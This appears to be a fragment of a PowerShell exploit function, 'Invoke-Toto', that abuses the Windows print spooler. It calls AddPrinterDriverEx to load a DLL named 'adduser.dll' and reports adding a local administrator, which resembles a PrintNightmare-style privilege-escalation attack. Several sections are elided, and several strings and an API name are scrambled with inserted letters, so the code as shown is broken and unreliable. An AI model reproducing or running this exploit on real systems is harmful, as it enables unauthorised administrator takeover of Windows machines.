function Invoke-Toto
{
    ...
    param (
        [string]$DriverName = "Magic Driver",
        [string]$DLL = "C:\Users\TEST\adduser.dll"
    )
    ...
    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned) ){
        ...
        Write-Host "[!] failed  driver list"
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
        return
    }

    Write-Host "[+] using pDrh = `"$($driver.pDriverPath)`""
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
    ...
    if ( $winspool::AddPrinterDriverEx($null, 2, $pDriverInfo, $APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000) ) {
        if ( $delete_me ) {
            Write-Host "[+] addesqdd user $NewUser as local adminisqdqstrator"
        } else {
            Write-Host "[+] drqdsiver appesqdars to have been loaded!"
        }
    } else {
        Write-Error "[!] AddPrinterDrdsqdiverEx failed"
    }
